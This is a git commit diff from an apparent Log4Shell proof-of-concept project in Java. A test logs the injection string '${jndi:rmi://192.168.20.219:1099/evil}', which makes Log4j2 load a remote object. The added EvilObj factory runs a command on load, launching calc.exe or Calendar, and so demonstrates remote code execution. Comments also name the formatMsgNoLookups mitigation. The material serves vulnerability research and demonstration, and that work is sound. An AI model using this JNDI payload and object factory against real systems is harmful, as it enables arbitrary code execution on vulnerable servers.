df3594c2bdbb2a4433b472909491b729beeda841
halibobo1205 <halibobo1205@gmail.com>
2021-12-13 17:30:20 +0800

    add shell & some Solutions

--- src/main/java/com/halibobo/log4j2/Log4j2Test.java
+++ src/main/java/com/halibobo/log4j2/Log4j2Test.java
@@ -4,12 +4,15 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 public class Log4j2Test {
-
+  static {
+    // Note This parameter looks useless.
+    // System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
+    // this works well
+    // System.setProperty("log4j2.formatMsgNoLookups","true");
+  }
   private static final Logger Logger = LogManager.getLogger();
 
   public static void main(String[] args) {
-    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
-
     String username = "${jndi:rmi://192.168.20.219:1099/evil}";
     Logger.info("hello, {}" ,username);
   }
--- src/main/java/com/halibobo/log4j2/rmi/EvilObj.java
+++ src/main/java/com/halibobo/log4j2/rmi/EvilObj.java
@@ -1,5 +1,6 @@
 package com.halibobo.log4j2.rmi;
 
+import java.io.IOException;
 import java.util.Hashtable;
 import javax.naming.Context;
 import javax.naming.Name;
@@ -9,6 +10,14 @@ public class EvilObj implements ObjectFactory {
 
   static {
     System.out.println("where i am?");
+    String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
+        ? new String[]{"cmd.exe","/c", "calc.exe"}
+        : new String[]{"open","/Applications/Calendar.app"};
+    try {
+      Runtime.getRuntime().exec(cmds).waitFor();
+    } catch (InterruptedException | IOException e) {
+      e.printStackTrace();
+    }
   }
 
   @Override
